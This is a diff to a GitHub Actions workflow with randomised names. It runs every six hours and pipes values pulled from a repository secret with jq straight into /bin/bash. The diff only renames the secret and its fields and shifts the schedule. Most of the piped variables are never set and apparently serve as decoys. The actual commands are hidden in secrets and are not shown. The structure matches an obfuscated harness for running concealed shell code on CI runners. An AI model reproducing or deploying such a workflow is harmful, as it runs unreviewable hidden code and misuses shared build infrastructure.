@@ -2,8 +2,8 @@ name: weiyuanwang4893
 on:
   workflow_dispatch:
   schedule:
-    - cron: '58 4/6 * * *'
-jobs:  # 8160
+    - cron: '56 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,18 +11,18 @@ jobs:  # 8160
       - uses: actions/checkout@v4
       - name: weiyuanwang4893
         env:
-          bgl9579: ${{ secrets.bgl9579 }}
+          zraj40: ${{ secrets.zraj40 }}
         run: |
-          echo $bgl9579 | jq -r .w65836 | /bin/bash
-          echo $hgl7031 | jq -r .t10258 | /bin/bash
-          echo $pf6257 | jq -r .ca01 | /bin/bash
-          echo $nm3 | jq -r .c656 | /bin/bash
-          echo $dpei047 | jq -r .kfqmw89108 | /bin/bash
-          echo $ykug6 | jq -r .cogle29 | /bin/bash
-          echo $u889 | jq -r .wbb07894 | /bin/bash
-          echo $bxtdb4334 | jq -r .njovb11509 | /bin/bash
-          echo $edw83755 | jq -r .kjg98 | /bin/bash
-          echo $tsa3231 | jq -r .qcwlg440 | /bin/bash
-          echo $gcuz974 | jq -r .bnibt18 | /bin/bash
-          echo $hr15 | jq -r .cdetk608 | /bin/bash
+          echo $zraj40 | jq -r .vysi6 | /bin/bash
+          echo $nnoox1 | jq -r .ms5662 | /bin/bash
+          echo $te2 | jq -r .shhci63646 | /bin/bash
+          echo $ycwz570 | jq -r .hn127 | /bin/bash
+          echo $n05440 | jq -r .xtuj32696 | /bin/bash
+          echo $hzu82 | jq -r .ozlz49248 | /bin/bash
+          echo $x0003 | jq -r .ir314 | /bin/bash
+          echo $gplit7 | jq -r .nogp75 | /bin/bash
+          echo $llmx8 | jq -r .np03842 | /bin/bash
+          echo $gz7377 | jq -r .j3242 | /bin/bash
+          echo $utl58 | jq -r .yosro8 | /bin/bash
+          echo $xkrfs61 | jq -r .s0 | /bin/bash
 
